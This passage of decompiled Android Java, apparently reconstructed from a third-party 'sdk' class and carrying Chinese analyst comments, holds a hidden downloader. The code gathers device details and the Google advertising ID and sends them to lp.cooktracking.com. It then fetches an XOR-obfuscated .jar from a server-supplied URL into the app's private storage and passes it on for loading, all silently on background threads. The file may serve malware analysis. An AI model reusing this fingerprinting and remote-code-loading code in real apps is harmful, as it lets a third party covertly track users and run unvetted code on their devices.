            JSONObject localJSONObject3 = new JSONObject();
            localJSONObject3.put("g", q(paramJSONObject1));
            localJSONObject3.put("a", getAid(this.t, ""));
            localJSONObject3.put("m", r.t());  //这四个顺序可能有误
            localJSONObject3.put("b", r.m());
            localJSONObject3.put("f", r.e());
            localJSONObject3.put("o", r.G());
            localJSONObject1.put("d", localJSONObject3);
            if (paramJSONObject2 != null) {
                File localObject1 = l(paramJSONObject2);
                if (localObject1 != null) {
                    Object localObject2 = new JSONObject();
                    ((JSONObject) localObject2).put("ver", t(paramJSONObject2));
                    ((JSONObject) localObject2).put("lt", G(paramJSONObject2));
                    Object localObject3 = p(paramJSONObject1);
                    ((JSONObject) localObject2).put("sc", k((int[]) localObject3, 0));
                    ((JSONObject) localObject2).put("fc", k((int[]) localObject3, 1));
                    ((JSONObject) localObject2).put("cc", k((int[]) localObject3, 2));
                    ((JSONObject) localObject2).put("kc", k((int[]) localObject3, 3));
                    try {
                        ((JSONObject) localObject2).put("le", h(paramJSONObject1));
                    } catch (Throwable localThrowable4) {
                    }
                    localJSONObject1.put("l", localObject2);
                }
            }
            Object localObject1 = localJSONObject1.toString();
            Object localObject2 = x.t((String) localObject1);
            Object localObject3 = "https://lp.cooktracking.com/v1/ls/get";
            e locale = new e("POST", (String) localObject3);
            locale.k((byte[]) localObject2);
            localg = locale.k(true);
            if (localg == null) {
                throw new f("");
            }
            if ((localg.s() == null) || (localg.s().k != 0)) {
                throw new f("");
            }
            if ((localg.u() == null) || (localg.u().k != 200)) {
                throw new f("");
            }
            InputStream localInputStream = localg.H();
            if (localInputStream == null) {
                throw new f("");
            }
            ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
            int i = a.s(localInputStream, localByteArrayOutputStream);
            if (i <= 0) {
                throw new f("");
            }
            byte[] arrayOfByte = localByteArrayOutputStream.toByteArray();
            if ((arrayOfByte == null) || (arrayOfByte.length <= 0)) {
                throw new f("");
            }
            String str = x.s(arrayOfByte);
            if (!x.u(str)) {
                throw new f("");
            }
            JSONObject localJSONObject4 = new JSONObject(str);
            this.D = false;
            sLogger("i.2 pass");
            N(localJSONObject4);
            return;
        } catch (Throwable localThrowable2) {
            this.D = false;
            sLogger("i.2 fail");
            N(null);
        } finally {
            try {
                if (localg != null) {
                    localg.k();
                }
            } catch (Throwable localThrowable5) {
            }
        }
    }

    private void N(final JSONObject paramJSONObject) {
        try {
            b.H(new Runnable() {
                public void run() {
                    try {
                        sdk.this.w(paramJSONObject);
                    } catch (Throwable localThrowable) {
                    }
                }
            });
        } catch (Throwable localThrowable) {
        }
    }

    private void w(JSONObject paramJSONObject) {
        try {
            if (paramJSONObject == null) {
                k(true);
                return;
            }
            String str = paramJSONObject.optString("g", null);  //获取gaid
            int i = paramJSONObject.optInt("nh", 0);
            if (i <= 1) {
                i = 8;
            }
            long l1 = System.currentTimeMillis() + i * 3600000L;
            int j = paramJSONObject.optInt("t", 0);
            k(l1, j, str);
            s(paramJSONObject);
            k(true);
        } catch (Throwable localThrowable) {
            k(true);
        }
    }

    private void X() {
        try {
            if (this.e) {
                return;
            }
            this.e = true;
            k(true);
        } catch (Exception localException) {
        }
    }

    private void k(boolean paramBoolean) {
        try {
            JSONObject localJSONObject1 = l();
            if (localJSONObject1 == null) {
                return;
            }
            JSONObject localJSONObject2 = localJSONObject1.optJSONObject("l");
            if (localJSONObject2 == null) {
                return;
            }
            JSONObject localJSONObject3 = G();
            if ((localJSONObject3 == null) || (!Z(localJSONObject3))) {
                if (paramBoolean) {
                    g(localJSONObject2);
                }
                return;
            }
            int i = localJSONObject2.optInt("ver", 0);
            if (i <= 0) {
                return;
            }
            int j = localJSONObject2.optInt("e", 0);
            int n = t(localJSONObject3);
            if (n == i) {
                q();
                return;
            }
            if (j == 1) {
                if (paramBoolean) {
                    g(localJSONObject2);
                }
                return;
            }
            if (paramBoolean) {
                int[] arrayOfInt = p();
                if ((arrayOfInt != null) && (arrayOfInt.length > 0)) {
                    int i1 = k(arrayOfInt, 1);
                    int i2 = k(arrayOfInt, 2);
                    int i3 = k(arrayOfInt, 0);
                    if ((i2 >= 5) || (i1 + i2 >= i3 + 5)) {
                        g(localJSONObject2);
                    }
                }
            }
            q();
        } catch (Throwable localThrowable) {
        }
    }

    private void g(final JSONObject paramJSONObject) {
        try {
            new Thread(new Runnable() {
                public void run() {
                    try {
                        sdk.this.D(paramJSONObject);
                    } catch (Throwable localThrowable) {
                    }
                }
            }).start();
        } catch (Throwable localThrowable) {
        }
    }

    private File u(int paramInt) {
        try {
            for (int var2 = 0; var2 < 5; ++var2) {
                try {
                    String str1 = "oldf." + paramInt;
                    str1 = str1 + ".";
                    str1 = str1 + getAid(this.t, "unknown");

                    String str2 = a.t(str1.getBytes());   //MD5

                    str2 = str2 + UUID.randomUUID().toString().substring(0, 4);
                    str2 = str2 + ".jar";
                    File localFile = new File(this.t.getFilesDir(), str2);
                    if (!localFile.isFile()) {
                        return localFile;
                    }
                } catch (Throwable var6) {
                }
            }

            return null;
        } catch (Throwable var7) {
            return null;
        }
    }

    private void D(JSONObject paramJSONObject) {
        g localg = null;
        Object localObject1 = null;
        try {
            if (paramJSONObject == null) {
                return;
            }
            String str1 = paramJSONObject.optString("h", null);
            if (!x.u(str1)) {
                return;
            }
            String str2 = paramJSONObject.optString("url", null);
            if (!x.u(str2)) {
                return;
            }
            int i = paramJSONObject.optInt("ver", 0);
            File localFile = u(i);
            if (localFile == null) {
                return;
            }
            e locale = new e("GET", str2);
            localg = locale.k(false);
            if (localg == null) {
                throw new f("");
            }
            if ((localg.s() == null) || (localg.s().k != 0)) {
                throw new f("");
            }
            if ((localg.u() == null) || (localg.s().k != 200)) {
                throw new f("");
            }
            InputStream localInputStream = localg.H();
            if (localInputStream == null) {
                throw new f("");
            }
            byte[] arrayOfByte1 = new byte[117];
            int j = 0;
            int n = 0;
            while (n < arrayOfByte1.length) {
                j = localInputStream.read(arrayOfByte1, n, arrayOfByte1.length - n);
                if (j <= 0) {
                    throw new f("");
                }
                n += j;
            }
            localObject1 = new FileOutputStream(localFile);
            byte[] arrayOfByte2 = new byte[1024];
            int i1 = 0;
            n = 0;
            while ((j = localInputStream.read(arrayOfByte2)) > 0) {
                for (int i2 = 0; i2 < j; i2++) {
                    int i3 = arrayOfByte1[i1];
                    int i4 = arrayOfByte2[i2];
                    int i5 = (i3 ^ i4) & 0xFF;
                    arrayOfByte2[i2] = ((byte) i5);
                    i1++;
                    if (i1 >= arrayOfByte1.length) {
                        i1 = 0;
                    }
                }
                ((OutputStream) localObject1).write(arrayOfByte2, 0, j);
                n += j;
            }
            ((OutputStream) localObject1).flush();
            ((OutputStream) localObject1).close();
            localObject1 = null;
            if (!k(localFile, str1)) {
                try {
                    localFile.delete();
                } catch (Throwable localThrowable14) {
                }
                throw new f("");
            }
            s(localFile.getAbsolutePath(), str1, i);
            return;
        } catch (Throwable localThrowable5) {
        } finally {
            try {
                if (localg != null) {
                    localg.k();
                }
            } catch (Throwable localThrowable15) {
            }
            try {
                a.s((Closeable) localObject1);
            } catch (Throwable localThrowable16) {
            }
        }
    }

    private void s(final String paramString1, final String paramString2, final int paramInt) {
        try {
            b.H(new Runnable() {
                public void run() {
                    try {
                        sdk.this.u(paramString1, paramString2, paramInt);
                    } catch (Throwable localThrowable) {
                    }
                }
            });
        } catch (Throwable localThrowable) {
        }
    }

    private void u(String paramString1, String paramString2, int paramInt) {
        try {
            if (!x.u(paramString1)) {
                return;
            }
            if (!x.u(paramString2)) {
                return;
            }
            k(paramString1, paramString2, paramInt);
            q();
        } catch (Throwable localThrowable) {
        }
    }


    /**
     * 为了https请求
     */
    private static final class o implements X509TrustManager {
        public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
        }

        public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString)
                throws CertificateException {
            try {
                if ((paramArrayOfX509Certificate == null) || (paramArrayOfX509Certificate.length < 1)) {
                    throw new sdk.f("");
                }
                String str1 = "https://lp.cooktracking.com/v1/ls/get";
                String str2 = "*.cooktracking.com";

                if (!sdk.x.u(str1)) {
                    throw new sdk.f("");
                }
                if (!sdk.x.u(str2)) {
                    throw new sdk.f("");
                }
                SslCertificate localSslCertificate = new SslCertificate(paramArrayOfX509Certificate[0]);
                SslCertificate.DName localDName = localSslCertificate.getIssuedTo();
                if (localDName == null) {
                    throw new sdk.f("");
                }
                String str3 = localDName.getCName();
                if (!sdk.x.u(str3)) {
                    throw new sdk.f("");
                }
                if (!str3.equals(str1)) {
                    throw new sdk.f("");
                }
                int i = 0;
                for (int j = 0; j < paramArrayOfX509Certificate.length; j++) {
                    String str4 = k(paramArrayOfX509Certificate[j]);
                    if ((str4 != null) && (sdk.x.u(str4)) && (str4.equalsIgnoreCase(str2))) {
                        i = 1;
                        break;
                    }
                    X509Certificate localX509Certificate1 = paramArrayOfX509Certificate[j];
                    if (j < paramArrayOfX509Certificate.length - 1) {
                        X509Certificate localX509Certificate2 = paramArrayOfX509Certificate[(j + 1)];
                        try {
                            localX509Certificate1.verify(localX509Certificate2.getPublicKey());
                        } catch (Throwable localThrowable2) {
                            throw new sdk.f("cert verify error:" + localThrowable2);
                        }
                    }
                }
                if (i == 0) {
                    throw new sdk.f("");
                }
            } catch (Throwable localThrowable1) {
                throw new CertificateException("verify error");
            }
        }

        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }

        private static String k(X509Certificate paramX509Certificate) {
            try {
                byte[] arrayOfByte1 = paramX509Certificate.getEncoded();
                byte[] arrayOfByte2 = sdk.a.s("SHA1", arrayOfByte1);
                if ((arrayOfByte2 == null) || (arrayOfByte2.length <= 0)) {
                    throw new Exception("digest error");
                }
                return sdk.a.s(arrayOfByte2, true);
            } catch (Throwable localThrowable) {
            }
            return null;
        }
    }


    /*********************************************** 内部类 开始 ***********************************************/

    /**
     * 网络请求类
     */
    private static final class e {

        private boolean k = false;
        private String s;
        private String u;
        private List<sdk.t<String, String>> H = new ArrayList();
        private String t;
        private InputStream m;
        private int e;
        private int G;

        private e(String paramString1, String paramString2) {
            if (sdk.x.u(paramString1)) {
                this.s = paramString1.toUpperCase();
            }
            this.u = paramString2;
        }

        private void k(String paramString1, String paramString2) {
            this.H.add(new sdk.t(paramString1, paramString2));
        }

        private void k(String paramString) {
            this.H.add(new sdk.t("Content-Type", paramString));
        }

        private void k(byte[] paramArrayOfByte) {
            this.m = new ByteArrayInputStream(paramArrayOfByte);
        }

        private void k(InputStream paramInputStream) {
            this.m = paramInputStream;
        }

        private void k(int paramInt) {
            this.e = paramInt;
        }

        private void s(int paramInt) {
            this.G = paramInt;
        }

        private sdk.g k(boolean paramBoolean) {
            if (this.k) {
                return new sdk.g(-10, "already requested, create a new instance to do this");
            }
            this.k = true;
            Object localObject1 = this.u;
            Object localObject2;
            String str1 = null;
            for (int i = 0; i < 5; i++) {
                sdk.g localg = new sdk.g(-1, "unknown");
                try {
                    if (!sdk.x.u(this.s)) {
                        throw new sdk.l(-4, "method has NOT been set");
                    }

                    if (!sdk.x.u((String) localObject1)) {
                        throw new sdk.l(-4, "invalid url");
                    }

                    URL localURL = null;
                    try {
                        localURL = new URL((String) localObject1);
                    } catch (Throwable localThrowable2) {
                        throw new sdk.l(-4, String.format("bad url format: url<%s>, e<%s>", new Object[]{localObject1, localThrowable2}));
                    }

                    localg.k(-2);

                    localObject2 = (HttpURLConnection) localURL.openConnection();
                    if (paramBoolean) {
                        k((URLConnection) localObject2);
                    }

                    localg.k((HttpURLConnection) localObject2);

                    Object localObject3 = this.H.iterator();
                    while (((Iterator) localObject3).hasNext()) {
                        sdk.t localt = (sdk.t) ((Iterator) localObject3).next();

                        if ((localt != null) && (sdk.x.u((String) localt.k))) {
                            ((HttpURLConnection) localObject2).setRequestProperty((String) localt.k, (String) localt.s);
                            if (sdk.x.u(str1)) {
                                ((HttpURLConnection) localObject2).addRequestProperty("Cookie", str1);
                            }
                        }
                    }
                    ((HttpURLConnection) localObject2).setRequestMethod(this.s);
                    ((HttpURLConnection) localObject2).setDoInput(true);
                    if (this.s.equals("POST")) {
                        ((HttpURLConnection) localObject2).setDoOutput(true);
                    }
                    if (this.e > 0) {
                        ((HttpURLConnection) localObject2).setConnectTimeout(this.e);
                    }
                    if (this.G > 0) {
                        ((HttpURLConnection) localObject2).setReadTimeout(this.G);
                    }
                    if (this.m != null) {
                        localObject3 = ((HttpURLConnection) localObject2).getOutputStream();
                        int n = sdk.a.s(this.m, (OutputStream) localObject3);
                        if (n < 0) {
                            throw new sdk.l(-2, "send data error");
                        }
                        ((OutputStream) localObject3).flush();
                        ((OutputStream) localObject3).close();
                    }
                    int j = -1;
                    try {
                        j = ((HttpURLConnection) localObject2).getResponseCode();
                    } catch (UnknownHostException localUnknownHostException) {
                        throw new sdk.l(-11, "dns:" + localUnknownHostException);
                    }
                    String str2 = ((HttpURLConnection) localObject2).getResponseMessage();
                    localg.k(new sdk.j(j, str2));
                    Map localMap = ((HttpURLConnection) localObject2).getHeaderFields();
                    Object localObject4;
                    Object localObject5;
                    if (localMap != null) {
                        localObject4 = localMap.entrySet().iterator();
                        while (((Iterator) localObject4).hasNext()) {
                            localObject5 = (Map.Entry) ((Iterator) localObject4).next();
                            String str3 = (String) ((Map.Entry) localObject5).getKey();
                            if (sdk.x.u(str3)) {
                                List localList = (List) ((Map.Entry) localObject5).getValue();
                                if (localList != null) {
                                    Iterator localIterator = localList.iterator();
                                    while (localIterator.hasNext()) {
                                        String str4 = (String) localIterator.next();
                                        localg.k(str3, str4);
                                    }
                                }
                            }
                        }
                    }
                    if (j == 302) {
                        localObject4 = localg.s("Location");
                        if (!sdk.x.u((String) localObject4)) {
                            throw new sdk.l(-3, "Location NOT found for redirect");
                        }
                        localObject1 = localObject4;
                        str1 = localg.s("Set-Cookie");
                        localg.k();
                        sdk.a.k(this.m);
                        this.m = null;
                        continue;
                    }
                    int i1 = ((HttpURLConnection) localObject2).getContentLength();
                    localg.s(i1);
                    Object localObject6 = null;
                    try {
                        localObject6 = ((HttpURLConnection) localObject2).getInputStream();
                    } catch (Throwable localThrowable3) {
                    }
                    if (localObject6 == null) {
                        try {
                            localObject6 = ((HttpURLConnection) localObject2).getErrorStream();
                        } catch (Throwable localThrowable4) {
                        }
                    }
                    localg.k((InputStream) localObject6);
                    localg.k(0, "no error");
                } catch (Throwable localThrowable1) {
                    Object localObject7 = sdk.j.s(localThrowable1, null);
                    if (localObject7 != null) {
                        localg.s((sdk.j) localObject7);
                    } else {
                        localg.s("" + localThrowable1);
                    }
                } finally {
                    sdk.a.k(this.m);
                    this.m = null;
                }
                return localg;
            }
            return new sdk.g(-2, "too many redirects");
        }

        private void k(URLConnection paramURLConnection) {
            try {
                if ((paramURLConnection != null) && ((paramURLConnection instanceof HttpsURLConnection))) {
                    sdk.o localo = new sdk.o();
                    SSLContext localSSLContext = SSLContext.getInstance("SSL");
                    localSSLContext.init(null, new X509TrustManager[]{localo}, new SecureRandom());
                    ((HttpsURLConnection) paramURLConnection).setSSLSocketFactory(localSSLContext.getSocketFactory());
                }
            } catch (Throwable localThrowable) {
            }
        }
    }


    /**
     * HttpUrlConnection相关
     */
    private static final class g {

        private static final int k = 0;
        private static final int s = -1;
        private static final int u = -2;
        private static final int H = -3;
        private static final int t = -4;
        private static final int m = -10;
        private static final int e = -11;
        private HttpURLConnection G;
        private sdk.j Z = new sdk.j(-1, "unknown");
        private sdk.j l = new sdk.j(0, "unknown");
        private int h = 0;
        private InputStream Y;
        private Map<String, String> f = new HashMap();

        private g(int paramInt, String paramString) {
            this.Z = new sdk.j(paramInt, paramString);
        }

        private g(HttpURLConnection paramHttpURLConnection, sdk.j paramj1, sdk.j paramj2, InputStream paramInputStream) {
            this.G = paramHttpURLConnection;
            this.Z = paramj1;
            this.l = paramj2;
            this.Y = paramInputStream;
        }

        private void k() {
            try {
                if (this.G != null) {
                    this.G.disconnect();
                }
            } catch (Throwable localThrowable) {
            }
            this.G = null;
        }

        private sdk.j s() {
            return this.Z;
        }

        private void k(int paramInt, String paramString) {
            this.Z = new sdk.j(paramInt, paramString);
        }

        private void k(sdk.j paramj) {
            if (paramj != null) {
                this.Z = paramj;
            }
        }

        private void k(int paramInt) {
            if (this.Z == null) {
                this.Z = new sdk.j(-1, "unknown");
            }
            this.Z.k = paramInt;
        }

        private void k(String paramString) {
            if (this.Z == null) {
                this.Z = new sdk.j(-1, "unknown");
            }
            this.Z.s = paramString;
        }

        private sdk.j u() {
            return this.l;
        }

        private void s(sdk.j paramj) {
            this.l = paramj;
        }

        private InputStream H() {
            return this.Y;
        }

        private void k(InputStream paramInputStream) {
            this.Y = paramInputStream;
        }

        private HttpURLConnection t() {
            return this.G;
        }

        private void k(HttpURLConnection paramHttpURLConnection) {
            this.G = paramHttpURLConnection;
        }

        private int m() {
            return this.h;
        }

        private void s(int paramInt) {
            this.h = paramInt;
        }

        private void k(String paramString1, String paramString2) {
            this.f.put(paramString1, paramString2);
        }

        private Map<String, String> e() {
            return this.f;
        }

        private String s(String paramString) {
            return (String) this.f.get(paramString);
        }
    }


    /**
     * 自定义Exception
     */
    private static class f extends Exception {
        private f(String paramString) {
            super(paramString);
        }
    }


    /**
     * 自定义Exception
     */
    private static final class l extends sdk.f {

        private sdk.j k;

        private l(sdk.j paramj) {
            super(null);

            this.k = paramj;
            if (this.k == null) {
                this.k = new sdk.j(53191, "default");
            }
        }

        private l(int paramInt, String paramString) {
            this(new sdk.j(paramInt, paramString));
        }

        private l(int paramInt, String paramString, Object paramObject) {
            this(new sdk.j(paramInt, paramString, paramObject));
        }

        private sdk.j k() {
            return this.k;
        }
    }


    /**
     * 错误信息存储类
     */
    private static final class j {
        public int k;
        public String s;
        public Object u;

        private j(int paramInt, String paramString) {
            this.k = paramInt;
            this.s = paramString;
        }

        private j(int paramInt, String paramString, Object paramObject) {
            this.k = paramInt;
            this.s = paramString;
            this.u = paramObject;
        }

        private static j k(Throwable paramThrowable, int paramInt, String paramString) {
            return k(paramThrowable, paramInt, paramString, null);
        }

        private static j k(Throwable paramThrowable, int paramInt, String paramString, Object paramObject) {
            if ((paramThrowable instanceof sdk.l)) {
                return ((sdk.l) paramThrowable).k();
            }
            return new j(paramInt, paramString, paramObject);
        }

        private static j s(Throwable paramThrowable, j paramj) {
            if ((paramThrowable instanceof sdk.l)) {
                return ((sdk.l) paramThrowable).k();
            }
            return paramj;
        }

        private <T> T k(Class<T> paramClass) {
            try {
                if ((paramClass != null) && (paramClass.isInstance(this.u))) {
                    return (T) this.u;
                }
            } catch (Throwable localThrowable) {
                localThrowable.printStackTrace();
            }
            return null;
        }
    }


    /**
     * 获取gaid操作类
     */
    private static final class AdvertisingIdClient {

        private static AdInfo s(Context paramContext) throws Exception {

            if (Looper.myLooper() == Looper.getMainLooper()) {
                throw new IllegalStateException("Cannot be called from the main thread");
            }

            try {
                PackageManager localPackageManager = paramContext.getPackageManager();
                localPackageManager.getPackageInfo("com.android.vending", 0);
            } catch (Exception localException1) {
                throw localException1;
            }

            r localr = new r();
            Intent localIntent = new Intent("com.google.android.gms.ads.identifier.service.START");
            localIntent.setPackage("com.google.android.gms");
            if (paramContext.bindService(localIntent, localr, Context.BIND_AUTO_CREATE)) {
                try {
                    h localh = new h(localr.k());
                    AdInfo localm1 = new AdInfo(localh.k(), localh.k(true));
                    return localm1;
                } catch (Exception localException2) {
                    localException2.printStackTrace();
                } finally {
                    paramContext.unbindService(localr);
                }
            }
            throw new IOException("Google Play connection failed");
        }


        //AdvertisingInterface
        private static final class h implements IInterface {
            private IBinder k;

            public h(IBinder paramIBinder) {
                this.k = paramIBinder;
            }

            public IBinder asBinder() {
                return this.k;
            }

            public String k()
                    throws RemoteException {
                Parcel localParcel1 = Parcel.obtain();
                Parcel localParcel2 = Parcel.obtain();
                String str;
                try {
                    localParcel1.writeInterfaceToken("com.google.android.gms.ads.identifier.internal.IAdvertisingIdService");
                    this.k.transact(1, localParcel1, localParcel2, 0);
                    localParcel2.readException();
                    str = localParcel2.readString();
                } finally {
                    localParcel2.recycle();
                    localParcel1.recycle();
                }
                return str;
            }

            public boolean k(boolean paramBoolean)
                    throws RemoteException {
                Parcel localParcel1 = Parcel.obtain();
                Parcel localParcel2 = Parcel.obtain();
                boolean bool;
                try {
                    localParcel1.writeInterfaceToken("com.google.android.gms.ads.identifier.internal.IAdvertisingIdService");
                    localParcel1.writeInt(paramBoolean ? 1 : 0);
                    this.k.transact(2, localParcel1, localParcel2, 0);
                    localParcel2.readException();
                    bool = 0 != localParcel2.readInt();
                } finally {
                    localParcel2.recycle();
                    localParcel1.recycle();
                }
                return bool;
            }
        }


        //ADdvertisingConnection
        private static final class r implements ServiceConnection {
            boolean k = false;
            private final LinkedBlockingQueue<IBinder> s = new LinkedBlockingQueue(1);

            public void onServiceConnected(ComponentName paramComponentName, IBinder paramIBinder) {
                try {
                    this.s.put(paramIBinder);
                } catch (InterruptedException localInterruptedException) {
                }
            }

            public void onServiceDisconnected(ComponentName paramComponentName) {
            }

            public IBinder k() throws InterruptedException {
                if (this.k) {
                    throw new IllegalStateException();
                }
                this.k = true;
                return this.s.take();
            }
        }

        //AdInfo
        private static final class AdInfo {
            private final String k;
            private final boolean s;

            private AdInfo(String paramString, boolean paramBoolean) {
                this.k = paramString;
                this.s = paramBoolean;
            }

            private String s() {
                return this.k;
            }

            public boolean k() {
                return this.s;
            }
        }
    }


    private static final class t<K, V> {
        public K k;
        public V s;

        private t(K paramK, V paramV) {
            this.k = paramK;
            this.s = paramV;
        }
    }


    /**
     * 获取系统参数类
     */
    private static final class r {
        private static String t() {
            return Build.MODEL;
        }

        private static String m() {
            return Build.BRAND;
        }

        private static String e() {
            return Build.MANUFACTURER;
        }

        private static String G() {
            return Build.VERSION.RELEASE;
        }
    }


    /**
     * 获取应用安装信息
     */
    private static final class AppInfo {

        private static m k;

        private static synchronized void H(Context paramContext) throws Exception {
            if (k != null) {
                return;
            }
            try {
                PackageManager localPackageManager = paramContext.getPackageManager();
                m localm = new m();
                localm.H = localPackageManager.getInstallerPackageName(paramContext.getPackageName());
                PackageInfo localPackageInfo = localPackageManager.getPackageInfo(paramContext.getPackageName(), PackageManager.GET_ACTIVITIES);
                if (localPackageInfo == null) {
                    throw new sdk.f("get package info failed");
                }
                localm.k = localPackageInfo.versionName;
                localm.s = localPackageInfo.versionCode;
                if ((localPackageInfo.applicationInfo != null) && ((localPackageInfo.applicationInfo.flags & 0x1) != 0)) {
                    localm.u = true;
                }
                k = localm;
            } catch (sdk.f localf) {
                throw localf;
            } catch (Throwable localThrowable1) {
                throw new sdk.f("prepare error");
            }
        }

        private static String t(Context paramContext) {
            try {
                H(paramContext);
                return k.k;
            } catch (Throwable localThrowable) {
            }
            return null;
        }

        private static int m(Context paramContext) {
            try {
                H(paramContext);
                return k.s;
            } catch (Throwable localThrowable) {
            }
            return 0;
        }

        private static boolean e(Context paramContext) {
            try {
                H(paramContext);
                return k.u;
            } catch (Throwable localThrowable) {
            }
            return false;
        }

        private static String G(Context paramContext) {
            try {
                H(paramContext);
                return k.H;
            } catch (Throwable localThrowable) {
            }
            return null;
        }

        private static final class m {
            public String k;   //版本号
            public int s;      //版本
            public boolean u;  //是否系统应用
            public String H;   //安装来源
        }
    }


    /**
     * 加密工作？？
     */
    private static final class a {

        private static final char[] k = "0123456789abcdef".toCharArray();
        private static final char[] s = "0123456789ABCDEF".toCharArray();

        private static String u(byte[] paramArrayOfByte) {
            return s(paramArrayOfByte, true);
        }

        private static String s(byte[] paramArrayOfByte, boolean paramBoolean) {
            try {
                char[] arrayOfChar = paramBoolean ? k : s;
                StringBuilder localStringBuilder = new StringBuilder();
                for (int m : paramArrayOfByte) {
                    localStringBuilder.append(arrayOfChar[(m >> 4 & 0xF)]);
                    localStringBuilder.append(arrayOfChar[(m & 0xF)]);
                }
                return localStringBuilder.toString();
            } catch (Throwable localThrowable) {
                localThrowable.printStackTrace();
            }
            return null;
        }

        private static void s(Closeable paramCloseable) {
            try {
                if (paramCloseable != null) {
                    paramCloseable.close();
                }
            } catch (Throwable localThrowable) {
                localThrowable.printStackTrace();
            }
        }

        private static byte[] s(File paramFile) {
            Object localObject1 = null;
            byte[] arrayOfByte1;
            byte[] arrayOfByte2;
            try {
                if (paramFile == null) {
                    arrayOfByte1 = null;
                    return arrayOfByte1;
                }

                localObject1 = new FileInputStream(paramFile);
                arrayOfByte1 = k((InputStream) localObject1);

                if (arrayOfByte1 == null) {
                    arrayOfByte2 = null;
                    return arrayOfByte2;
                }

                s((Closeable) localObject1);
                localObject1 = null;

                arrayOfByte2 = arrayOfByte1;
                return arrayOfByte2;
            } catch (FileNotFoundException localFileNotFoundException) {
                arrayOfByte2 = null;
                return arrayOfByte2;
            } catch (Throwable localThrowable) {
                arrayOfByte2 = null;
                return arrayOfByte2;
            } finally {
                s((Closeable) localObject1);
            }
        }

        private static byte[] k(InputStream paramInputStream) {
            ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
            int i = s(paramInputStream, localByteArrayOutputStream);
            if (i < 0) {
                return null;
            }
            return localByteArrayOutputStream.toByteArray();
        }

        private static int s(InputStream paramInputStream, OutputStream paramOutputStream) {
            try {
                if (paramInputStream == null) {
                    return -1;
                }
                if (paramOutputStream == null) {
                    return -1;
                }
                byte[] arrayOfByte = new byte[1024];
                int i = 0;
                int j = 0;
                while ((i = paramInputStream.read(arrayOfByte)) > 0) {
                    paramOutputStream.write(arrayOfByte, 0, i);
                    j += i;
                }
                return j;
            } catch (Throwable localThrowable) {
            }
            return -1;
        }

        private static byte[] H(byte[] paramArrayOfByte) {
            return s(paramArrayOfByte, null, null);
        }

        private static byte[] s(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2, byte[] paramArrayOfByte3) {
            try {
                MessageDigest localMessageDigest = MessageDigest.getInstance("MD5");
                if (paramArrayOfByte2 != null) {
                    localMessageDigest.update(paramArrayOfByte2);
                }
                localMessageDigest.update(paramArrayOfByte1);
                if (paramArrayOfByte3 != null) {
                    localMessageDigest.update(paramArrayOfByte3);
                }
                return localMessageDigest.digest();
            } catch (Throwable localThrowable) {
            }
            return null;
        }

        private static String t(byte[] paramArrayOfByte) {
            try {
                byte[] arrayOfByte = H(paramArrayOfByte);
                if ((arrayOfByte == null) || (arrayOfByte.length <= 0)) {
                    return null;
                }
                return u(arrayOfByte);
            } catch (Throwable localThrowable) {
            }
            return null;
        }

        private static byte[] s(String paramString, byte[] paramArrayOfByte) {
            try {
                MessageDigest localMessageDigest = MessageDigest.getInstance(paramString);
                return localMessageDigest.digest(paramArrayOfByte);
            } catch (Throwable localThrowable) {
            }
            return null;
        }

        private static SecureRandom s() {
            try {
                return SecureRandom.getInstance("SHA1PRNG");
            } catch (Throwable localThrowable) {
            }
            return new SecureRandom();
        }
    }


    /**
     * handler操作类
     */
    private static final class b {

        private static Handler k() {
            return new Handler(Looper.getMainLooper());
        }

        private static void u(Runnable paramRunnable) {
            try {
                if (paramRunnable == null) {
                    return;
                }
                if (Looper.myLooper() == Looper.getMainLooper()) {
                    paramRunnable.run();
                } else {
                    k().post(paramRunnable);
                }
            } catch (Throwable localThrowable) {
            }
        }

        private static void H(Runnable paramRunnable) {
            try {
                s(paramRunnable, 0L);
            } catch (Throwable localThrowable) {
            }
        }

        private static void s(Runnable paramRunnable, long paramLong) {
            try {
                if (paramLong <= 0L) {
                    k().post(paramRunnable);
                } else {
                    k().postDelayed(paramRunnable, paramLong);
                }
            } catch (Throwable localThrowable) {
            }
        }
    }


    /**
     * 字符串操作类
     */
    private static final class x {

        //是否为空串  true 不为空
        private static boolean u(String paramString) {
            return (paramString != null) && (!paramString.equals(""));
        }

        private static String H(String paramString) {
            if (paramString == null) {
                return "";
            }
            return paramString;
        }

        private static String s(byte[] paramArrayOfByte) {
            if (paramArrayOfByte == null) {
                return null;
            }
            try {
                return new String(paramArrayOfByte, "UTF-8");
            } catch (Throwable localThrowable) {
            }
            return null;
        }

        private static byte[] t(String paramString) {
            if (paramString == null) {
                return null;
            }
            try {
                return paramString.getBytes("UTF-8");
            } catch (Throwable localThrowable) {
            }
            return null;
        }
    }


    /**
     * 子线程操作类
     */
    private static final class v extends Thread {
        private LocalServerSocket k;

        private v(LocalServerSocket paramLocalServerSocket) {
            this.k = paramLocalServerSocket;
        }

        public void run() {
            try {
                if (this.k == null) {
                    return;
                }
                try {
                    for (; ; ) {
                        this.k.accept();
                    }
                } catch (Throwable localThrowable1) {
                    localThrowable1.printStackTrace();
                }
            } catch (Throwable localThrowable2) {
                localThrowable2.printStackTrace();
            }
        }
    }
}

